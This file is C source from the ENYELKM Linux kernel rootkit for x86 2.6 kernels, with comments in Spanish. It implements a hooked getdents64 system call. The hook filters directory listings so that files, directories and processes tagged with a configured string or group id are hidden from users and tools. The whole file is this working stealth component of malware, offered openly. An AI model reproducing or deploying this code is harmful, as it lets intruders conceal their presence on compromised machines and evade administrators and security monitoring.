/*
 * ENYELKM v1.1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe & David Reguera Garc�a
 * < raise@enye-sec.org 
 * http://www.enye-sec.org >
 *
 * davidregar@yahoo.es - http://www.fr33project.org
 */

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/dirent.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"



/* declaraciones externas */
extern asmlinkage long (*orig_getdents64)
            (unsigned int fd, struct dirent64 *dirp, unsigned int count);


asmlinkage long hacked_getdents64
	 (unsigned int fd, struct dirent64 *dirp, unsigned int count)
{
struct dirent64 *td1, *td2;
long ret, tmp;
unsigned long hpid;
short int mover_puntero, ocultar_proceso;


/* llamamos a la syscall original */
ret = (*orig_getdents64) (fd, dirp, count);

/* si vale cero retornamos */
if (!ret)
	return(ret);


/* copiamos la lista al kernel space */
td2 = (struct dirent64 *) kmalloc(ret, GFP_KERNEL);
__copy_from_user(td2, dirp, ret);


/* inicializamos punteros y contadores */
td1 = td2, tmp = ret;

while (tmp > 0)
	{
	tmp -= td1->d_reclen;
	mover_puntero = 1;
	ocultar_proceso = 0;
	hpid = 0;

	hpid = simple_strtoul(td1->d_name, NULL, 10);

	/* ocultacion de procesos */
	if (hpid != 0)
		{
		struct task_struct *htask = current;

		/* buscamos el pid */
		do  {
			if(htask->pid == hpid)
				break;
			else
				htask = next_task(htask);
			} while (htask != current);

		/* lo ocultamos */
		if (((htask->pid == hpid) && (htask->gid == SGID)) ||
			((htask->pid == hpid) && (strstr(htask->comm, SHIDE) != NULL)))
			ocultar_proceso = 1;
        }


	/* ocultacion de ficheros/directorios */
	if ((ocultar_proceso) || (strstr(td1->d_name, SHIDE) != NULL))
		{
		/* una entrada menos */
		ret -= td1->d_reclen;

		/* no moveremos el puntero al siguiente */
		mover_puntero = 0;

		if (tmp)
			/* no es el ultimo */
			memmove(td1, (char *) td1 + td1->d_reclen, tmp);
		}

	if ((tmp) && (mover_puntero))
		td1 = (struct dirent64 *) ((char *) td1 + td1->d_reclen);

	} /* fin while */

/* copiamos la lista al user space again */
if( __copy_to_user((void *) dirp, (void *) td2, ret) != 0 )
{
/* ERROR */
}

kfree(td2);

return(ret);

} /********** fin hacked_getdents[64] *********/


/* EOF */
